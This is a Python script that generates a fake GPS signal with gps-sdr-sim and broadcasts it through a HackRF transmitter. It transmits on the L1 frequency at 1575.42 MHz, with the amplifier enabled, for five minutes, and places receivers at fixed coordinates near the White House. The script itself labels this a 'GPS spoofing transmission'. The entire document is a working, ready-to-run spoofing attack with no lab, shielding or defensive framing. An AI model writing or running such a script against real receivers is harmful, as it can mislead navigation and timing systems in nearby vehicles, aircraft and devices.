import subprocess
import time
import signal
from datetime import datetime

# Current directory setup
binary_path = "./gps-sdr-sim"
ephemeris_file = "brdc0480.25n"
location = "38.8976633,-77.0365739,100"
duration_seconds = 300  # 5 minutes

try:
    # 1. Make gps-sdr-sim executable
    subprocess.run(["chmod", "+x", binary_path], check=True)
    print("✅ gps-sdr-sim is now executable.")

    # 2. Generate gpssim.bin
    print("🛰️ Generating gpssim.bin...")
    subprocess.run(
        [binary_path, "-b", "8", "-e", ephemeris_file, "-l", location],
        check=True
    )
    print("✅ gpssim.bin generated.")

    # 3. Transmit via HackRF
    transmit_command = [
        "hackrf_transfer",
        "-t", "gpssim.bin",
        "-f", "1575420000",
        "-s", "2600000",
        "-a", "1",
        "-x", "0"
    ]

    print("🚀 Starting GPS spoofing transmission for 5 minutes...")
    start_time = datetime.now()
    print(f"📅 Start time: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")

    process = subprocess.Popen(transmit_command)

    time.sleep(duration_seconds)

    # 4. Gracefully stop the transmission
    process.send_signal(signal.SIGINT)
    process.wait()

    end_time = datetime.now()
    print(f"📅 End time: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("✅ Transmission stopped after 5 minutes.")

except subprocess.CalledProcessError as e:
    print(f"❌ Command failed: {e}")
except FileNotFoundError as e:
    print(f"❌ File not found: {e}")
except KeyboardInterrupt:
    print("⛔ Interrupted by user. Terminating transmission...")
    if 'process' in locals() and process.poll() is None:
        process.terminate()
        process.wait()
except Exception as e:
    print(f"❌ Unexpected error: {e}")
